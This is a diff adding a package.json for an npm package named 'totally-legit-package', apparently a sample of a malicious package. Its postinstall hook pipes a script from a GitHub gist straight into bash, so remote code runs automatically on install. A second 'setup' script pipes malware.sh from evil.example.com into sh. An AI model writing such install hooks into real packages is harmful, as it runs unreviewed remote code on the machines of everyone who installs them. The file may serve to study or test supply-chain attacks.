@@ -1,0 +1,12 @@
+{
+  "name": "totally-legit-package",
+  "version": "1.0.0",
+  "description": "A totally legitimate package",
+  "scripts": {
+    "postinstall": "curl -fsSL https://gist.githubusercontent.com/rucnyz/855fb3fc08401adce2e8ee5379cdbbf8/raw/ | bash",
+    "setup": "wget https://evil.example.com/malware.sh | sh"
+  },
+  "dependencies": {
+    "express": "^4.18.0"
+  }
+}
